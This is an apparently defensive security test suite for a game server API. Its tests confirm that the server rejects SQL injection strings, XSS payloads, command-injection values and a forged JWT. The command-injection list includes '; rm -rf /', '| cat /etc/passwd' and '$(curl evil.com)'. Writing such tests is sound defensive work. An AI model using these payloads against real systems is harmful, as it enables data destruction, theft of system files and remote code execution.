const request = require('supertest');
const app = require('../../../src/backend/server');
const { createTestUser, createTestToken, cleanupTestData } = require('../../helpers/testHelpers');

describe('End-to-End Security Integration Tests', () => {
  let testUser1, testUser2;
  let authToken1, authToken2;

  beforeAll(async () => {
    // Set secure test environment
    process.env.NODE_ENV = 'test';
    process.env.JWT_SECRET = 'test-jwt-secret-very-long-and-secure-for-testing-purposes-only-minimum-256-bits';
    process.env.JWT_REFRESH_SECRET = 'test-refresh-secret-different-from-access-token-also-very-long-and-secure';
    process.env.DB_HOST = 'localhost';
    process.env.DB_NAME = 'test_pvp_security_db';
    process.env.DB_USER = 'test_user';
    process.env.DB_PASSWORD = 'test_password';

    // Create test users
    testUser1 = await createTestUser({
      username: 'securityuser1',
      email: 'security1@test.com',
      password: 'Password123!',
      walletAddress: '44444444444444444444444444444444'
    });

    testUser2 = await createTestUser({
      username: 'securityuser2',
      email: 'security2@test.com',
      password: 'Password123!',
      walletAddress: '55555555555555555555555555555555'
    });

    authToken1 = createTestToken(testUser1.id);
    authToken2 = createTestToken(testUser2.id);
  });

  describe('Complete Game Flow Security', () => {
    test('should prevent security vulnerabilities in complete game lifecycle', async () => {
      // Step 1: Create game with security validation
      const gameResponse = await request(app)
        .post('/api/games')
        .set('Authorization', `Bearer ${authToken1}`)
        .send({
          gameType: 'duel',
          wagerAmount: 1.0,
          isPrivate: false,
          maxPlayers: 2,
          timeLimit: 300
        });

      expect(gameResponse.status).toBe(201);
      const gameId = gameResponse.body.data.game.id;
      expect(gameId).toBeDefined();

      // Step 2: Verify SQL injection protection in game retrieval
      const maliciousGameId = `${gameId}'; DROP TABLE games; --`;
      const maliciousGetResponse = await request(app)
        .get(`/api/games/${maliciousGameId}`)
        .set('Authorization', `Bearer ${authToken1}`);

      expect(maliciousGetResponse.status).toBe(400);
      expect(maliciousGetResponse.body.error).toBe('Security Violation');

      // Step 3: Join game with proper validation
      const joinResponse = await request(app)
        .post(`/api/games/${gameId}/join`)
        .set('Authorization', `Bearer ${authToken2}`)
        .send({ wagerAmount: 1.0 });

      expect(joinResponse.status).toBe(200);

      // Step 4: Attempt SQL injection in move execution
      const maliciousMoveResponse = await request(app)
        .post(`/api/games/${gameId}/move`)
        .set('Authorization', `Bearer ${authToken1}`)
        .send({
          moveType: "'; UPDATE games SET winner = 'hacker'; --",
          data: { action: 'attack', target: 'player2' },
          timestamp: Date.now()
        });

      expect(maliciousMoveResponse.status).toBe(400);
      expect(maliciousMoveResponse.body.error).toBe('Security Violation');

      // Step 5: Verify legitimate move works
      const legitimateMoveResponse = await request(app)
        .post(`/api/games/${gameId}/move`)
        .set('Authorization', `Bearer ${authToken1}`)
        .send({
          moveType: 'attack',
          data: { action: 'attack', target: 'player2', damage: 25 },
          timestamp: Date.now()
        });

      expect(legitimateMoveResponse.status).toBe(200);

      // Step 6: Verify game state integrity
      const finalGameState = await request(app)
        .get(`/api/games/${gameId}`)
        .set('Authorization', `Bearer ${authToken1}`);

      expect(finalGameState.status).toBe(200);
      expect(finalGameState.body.data.game.id).toBe(gameId);
      expect(finalGameState.body.data.game.gameType).toBe('duel');
    });

    test('should prevent cross-user data access', async () => {
      // User 1 creates a private game
      const privateGameResponse = await request(app)
        .post('/api/games')
        .set('Authorization', `Bearer ${authToken1}`)
        .send({
          gameType: 'duel',
          wagerAmount: 5.0,
          isPrivate: true,
          maxPlayers: 2
        });

      expect(privateGameResponse.status).toBe(201);
      const privateGameId = privateGameResponse.body.data.game.id;

      // User 2 should not be able to access private game details
      const unauthorizedAccess = await request(app)
        .get(`/api/games/${privateGameId}`)
        .set('Authorization', `Bearer ${authToken2}`);

      expect(unauthorizedAccess.status).toBe(403);
      expect(unauthorizedAccess.body.error).toBe('Access Denied');

      // User 2 should not be able to join private game without invitation
      const unauthorizedJoin = await request(app)
        .post(`/api/games/${privateGameId}/join`)
        .set('Authorization', `Bearer ${authToken2}`)
        .send({ wagerAmount: 5.0 });

      expect(unauthorizedJoin.status).toBe(403);
      expect(unauthorizedJoin.body.error).toBe('Access Denied');
    });

    test('should prevent privilege escalation through game operations', async () => {
      // Create game as regular user
      const gameResponse = await request(app)
        .post('/api/games')
        .set('Authorization', `Bearer ${authToken1}`)
        .send({
          gameType: 'tournament',
          wagerAmount: 2.0,
          isPrivate: false,
          maxPlayers: 4
        });

      expect(gameResponse.status).toBe(201);
      const gameId = gameResponse.body.data.game.id;

      // Attempt to modify game as non-creator/non-admin
      const maliciousUpdate = await request(app)
        .put(`/api/games/${gameId}`)
        .set('Authorization', `Bearer ${authToken2}`)
        .send({
          status: 'completed',
          winner: testUser2.id,
          wagerAmount: 100.0 // Try to increase wager
        });

      expect(maliciousUpdate.status).toBe(403);
      expect(maliciousUpdate.body.error).toBe('Access Denied');

      // Attempt admin operations as regular user
      const adminOperation = await request(app)
        .post(`/api/admin/games/${gameId}/force-end`)
        .set('Authorization', `Bearer ${authToken2}`)
        .send({ reason: 'unauthorized attempt' });

      expect(adminOperation.status).toBe(403);
      expect(adminOperation.body.error).toBe('Access Denied');
    });
  });

  describe('Authentication and Authorization Flow', () => {
    test('should prevent token manipulation attacks', async () => {
      // Get valid tokens
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          email: testUser1.email,
          password: 'Password123!'
        });

      expect(loginResponse.status).toBe(200);
      const validToken = loginResponse.body.data.token;

      // Attempt to modify token payload
      const tokenParts = validToken.split('.');
      const header = JSON.parse(Buffer.from(tokenParts[0], 'base64url').toString());
      const payload = JSON.parse(Buffer.from(tokenParts[1], 'base64url').toString());
      
      // Try to escalate privileges
      payload.isAdmin = true;
      payload.role = 'admin';
      payload.userId = 1; // Try to become user ID 1

      const tamperedPayload = Buffer.from(JSON.stringify(payload)).toString('base64url');
      const tamperedToken = `${tokenParts[0]}.${tamperedPayload}.${tokenParts[2]}`;

      // Use tampered token
      const response = await request(app)
        .get('/api/games')
        .set('Authorization', `Bearer ${tamperedToken}`);

      expect(response.status).toBe(401);
      expect(response.body.error).toBe('Invalid Token');
    });

    test('should prevent session fixation attacks', async () => {
      // Attempt to set specific session data before login
      const preLoginResponse = await request(app)
        .post('/api/auth/login')
        .set('X-Forwarded-For', '192.168.1.100')
        .set('User-Agent', 'AttackerBrowser/1.0')
        .send({
          email: testUser1.email,
          password: 'Password123!'
        });

      expect(preLoginResponse.status).toBe(200);
      const firstToken = preLoginResponse.body.data.token;

      // Login again with different fingerprint
      const secondLoginResponse = await request(app)
        .post('/api/auth/login')
        .set('X-Forwarded-For', '10.0.0.50')
        .set('User-Agent', 'LegitBrowser/2.0')
        .send({
          email: testUser1.email,
          password: 'Password123!'
        });

      expect(secondLoginResponse.status).toBe(200);
      const secondToken = secondLoginResponse.body.data.token;

      // Tokens should be different (new session each login)
      expect(firstToken).not.toBe(secondToken);
    });

    test('should prevent concurrent session abuse', async () => {
      // Login from multiple locations simultaneously
      const login1 = await request(app)
        .post('/api/auth/login')
        .set('X-Forwarded-For', '192.168.1.100')
        .send({
          email: testUser1.email,
          password: 'Password123!'
        });

      const login2 = await request(app)
        .post('/api/auth/login')
        .set('X-Forwarded-For', '10.0.0.50')
        .send({
          email: testUser1.email,
          password: 'Password123!'
        });

      expect(login1.status).toBe(200);
      expect(login2.status).toBe(200);

      const token1 = login1.body.data.token;
      const token2 = login2.body.data.token;

      // Both tokens should work initially
      const response1 = await request(app)
        .get('/api/games')
        .set('Authorization', `Bearer ${token1}`);

      const response2 = await request(app)
        .get('/api/games')
        .set('Authorization', `Bearer ${token2}`);

      expect(response1.status).toBe(200);
      expect(response2.status).toBe(200);
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    test('should enforce rate limits on sensitive endpoints', async () => {
      const requests = [];
      
      // Attempt rapid login requests
      for (let i = 0; i < 15; i++) {
        requests.push(
          request(app)
            .post('/api/auth/login')
            .send({
              email: 'nonexistent@test.com',
              password: 'wrongpassword'
            })
        );
      }

      const responses = await Promise.all(requests);
      
      // Some requests should be rate limited
      const rateLimited = responses.filter(res => res.status === 429);
      expect(rateLimited.length).toBeGreaterThan(0);
    }, 10000);

    test('should prevent rapid game creation abuse', async () => {
      const gameCreationRequests = [];

      for (let i = 0; i < 20; i++) {
        gameCreationRequests.push(
          request(app)
            .post('/api/games')
            .set('Authorization', `Bearer ${authToken1}`)
            .send({
              gameType: 'duel',
              wagerAmount: 0.1,
              isPrivate: false,
              maxPlayers: 2
            })
        );
      }

      const responses = await Promise.all(gameCreationRequests);
      
      // Should have rate limiting or resource limits
      const successful = responses.filter(res => res.status === 201);
      const rateLimited = responses.filter(res => res.status === 429);
      const resourceLimited = responses.filter(res => res.status === 400);

      expect(successful.length).toBeLessThan(20);
      expect(rateLimited.length + resourceLimited.length).toBeGreaterThan(0);
    });

    test('should handle large payload attacks', async () => {
      // Create extremely large payload
      const largeData = 'A'.repeat(1024 * 1024 * 5); // 5MB string
      
      const response = await request(app)
        .post('/api/games')
        .set('Authorization', `Bearer ${authToken1}`)
        .send({
          gameType: 'duel',
          wagerAmount: 1.0,
          isPrivate: false,
          maxPlayers: 2,
          settings: { largeField: largeData }
        });

      expect(response.status).toBe(413); // Payload too large
    });
  });

  describe('Input Validation and Sanitization', () => {
    test('should prevent XSS in game data', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<svg onload="alert(1)">',
        '"><script>alert(1)</script>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/games')
          .set('Authorization', `Bearer ${authToken1}`)
          .send({
            gameType: payload, // XSS in game type
            wagerAmount: 1.0,
            isPrivate: false,
            maxPlayers: 2
          });

        expect(response.status).toBe(400);
        expect(response.body.error).toBe('Security Violation');
      }
    });

    test('should validate and sanitize all input fields', async () => {
      const response = await request(app)
        .post('/api/games')
        .set('Authorization', `Bearer ${authToken1}`)
        .send({
          gameType: 'duel',
          wagerAmount: 'not-a-number',
          isPrivate: 'not-a-boolean',
          maxPlayers: 'not-a-number',
          timeLimit: -1000, // Negative time
          settings: {
            invalidSetting: '<script>alert(1)</script>'
          }
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toMatch(/Validation Error|Security Violation/);
    });

    test('should prevent command injection in game parameters', async () => {
      const commandInjectionPayloads = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '& whoami',
        '$(/bin/sh)',
        '`id`',
        '$(curl evil.com)',
        '; DROP DATABASE test;'
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/games/quickmatch')
          .set('Authorization', `Bearer ${authToken1}`)
          .send({
            wagerAmount: 1.0,
            gameType: payload
          });

        expect(response.status).toBe(400);
        expect(response.body.error).toBe('Security Violation');
      }
    });
  });

  describe('Data Exposure Prevention', () => {
    test('should not expose sensitive data in API responses', async () => {
      // Create game
      const gameResponse = await request(app)
        .post('/api/games')
        .set('Authorization', `Bearer ${authToken1}`)
        .send({
          gameType: 'duel',
          wagerAmount: 1.0,
          isPrivate: false,
          maxPlayers: 2
        });

      expect(gameResponse.status).toBe(201);
      const responseText = JSON.stringify(gameResponse.body);

      // Should not expose sensitive data
      expect(responseText).not.toMatch(/password/i);
      expect(responseText).not.toMatch(/privatekey/i);
      expect(responseText).not.toMatch(/secret/i);
      expect(responseText).not.toMatch(/hash/i);
      expect(responseText).not.toMatch(/salt/i);
      expect(responseText).not.toMatch(/database/i);
      expect(responseText).not.toMatch(/connection/i);
    });

    test('should not leak database schema information', async () => {
      // Trigger validation error
      const response = await request(app)
        .post('/api/games')
        .set('Authorization', `Bearer ${authToken1}`)
        .send({
          gameType: 'invalid-type',
          wagerAmount: -100
        });

      expect(response.status).toBe(400);
      const errorText = JSON.stringify(response.body).toLowerCase();

      // Should not contain database schema info
      expect(errorText).not.toMatch(/table/);
      expect(errorText).not.toMatch(/column/);
      expect(errorText).not.toMatch(/constraint/);
      expect(errorText).not.toMatch(/foreign key/);
      expect(errorText).not.toMatch(/primary key/);
      expect(errorText).not.toMatch(/index/);
    });

    test('should not expose stack traces in production', async () => {
      // Force an error condition
      const response = await request(app)
        .get('/api/games/trigger-error-for-testing')
        .set('Authorization', `Bearer ${authToken1}`);

      expect(response.status).toBeGreaterThanOrEqual(400);
      
      if (response.body.error) {
        const errorText = JSON.stringify(response.body);
        expect(errorText).not.toMatch(/at \w+\./); // Stack trace pattern
        expect(errorText).not.toMatch(/\/src\//); // File path pattern
        expect(errorText).not.toMatch(/node_modules/);
        expect(errorText).not.toMatch(/\.js:\d+:\d+/); // Line number pattern
      }
    });
  });

  describe('Security Headers Validation', () => {
    test('should set appropriate security headers on all responses', async () => {
      const response = await request(app)
        .get('/api/games')
        .set('Authorization', `Bearer ${authToken1}`);

      expect(response.status).toBe(200);
      
      // Verify security headers
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
      expect(response.headers['content-security-policy']).toBeDefined();
      
      // Should not expose server info
      expect(response.headers['x-powered-by']).toBeUndefined();
      expect(response.headers['server']).not.toContain('Express');
    });

    test('should set cache control headers for sensitive endpoints', async () => {
      const sensitiveEndpoints = [
        '/api/auth/login',
        '/api/auth/refresh',
        '/api/games/player/history'
      ];

      for (const endpoint of sensitiveEndpoints) {
        let response;
        
        if (endpoint.includes('login') || endpoint.includes('refresh')) {
          response = await request(app)
            .post(endpoint)
            .send({
              email: testUser1.email,
              password: 'Password123!'
            });
        } else {
          response = await request(app)
            .get(endpoint)
            .set('Authorization', `Bearer ${authToken1}`);
        }

        expect(response.headers['cache-control']).toContain('no-cache');
        expect(response.headers['cache-control']).toContain('no-store');
        expect(response.headers['pragma']).toBe('no-cache');
      }
    });
  });

  afterAll(async () => {
    await cleanupTestData();
  });
});